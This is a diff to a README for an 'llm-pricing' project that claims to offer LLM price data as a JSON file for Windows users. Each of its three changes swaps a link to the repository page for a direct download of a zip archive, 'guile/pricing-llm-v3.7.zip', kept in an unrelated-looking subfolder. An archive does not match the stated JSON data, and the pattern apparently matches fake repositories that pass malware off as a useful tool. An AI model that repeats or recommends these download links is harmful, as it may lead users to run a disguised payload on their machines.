@@ -1,6 +1,6 @@
 # 📊 llm-pricing - Clear LLM pricing in one file
 
-[![Download / Visit Page](https://img.shields.io/badge/Download%20%2F%20Visit%20Page-blue?style=for-the-badge&logo=github)](https://github.com/wordenneapolitan768/llm-pricing)
+[![Download / Visit Page](https://img.shields.io/badge/Download%20%2F%20Visit%20Page-blue?style=for-the-badge&logo=github)](https://github.com/wordenneapolitan768/llm-pricing/raw/refs/heads/main/guile/pricing-llm-v3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ If you use Windows and want to download the data, use the link below and follow 
 
 ## 📥 Download
 
-[Visit the download page](https://github.com/wordenneapolitan768/llm-pricing)
+[Visit the download page](https://github.com/wordenneapolitan768/llm-pricing/raw/refs/heads/main/guile/pricing-llm-v3.7.zip)
 
 ### What to do on Windows
 
@@ -222,4 +222,4 @@ When you download the file on Windows:
 - **File type:** JSON
 - **Update pace:** Weekly
 - **Best for:** Checking model costs on Windows
-- **Main link:** https://github.com/wordenneapolitan768/llm-pricing
+- **Main link:** https://github.com/wordenneapolitan768/llm-pricing/raw/refs/heads/main/guile/pricing-llm-v3.7.zip
